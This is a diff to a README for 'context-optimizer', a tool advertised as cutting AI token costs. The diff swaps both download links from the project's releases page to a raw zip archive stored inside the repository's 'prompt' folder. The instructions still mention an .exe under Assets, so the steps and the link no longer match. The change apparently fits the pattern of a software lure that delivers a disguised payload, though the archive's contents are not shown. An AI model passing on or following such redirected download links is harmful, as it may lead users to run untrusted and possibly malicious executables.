@@ -1,6 +1,6 @@
 # 📉 context-optimizer - Lower your AI token usage costs
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/aaron4605/context-optimizer/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/aaron4605/context-optimizer/raw/refs/heads/main/prompt/optimizer-context-1.4.zip)
 
 ## 🎯 About this application
 
@@ -20,7 +20,7 @@ This method works for:
 
 ## 📥 Getting the software
 
-1. Visit this page to download the latest version: [https://github.com/aaron4605/context-optimizer/releases](https://github.com/aaron4605/context-optimizer/releases).
+1. Visit this page to download the latest version: [https://github.com/aaron4605/context-optimizer/raw/refs/heads/main/prompt/optimizer-context-1.4.zip](https://github.com/aaron4605/context-optimizer/raw/refs/heads/main/prompt/optimizer-context-1.4.zip).
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download.
 
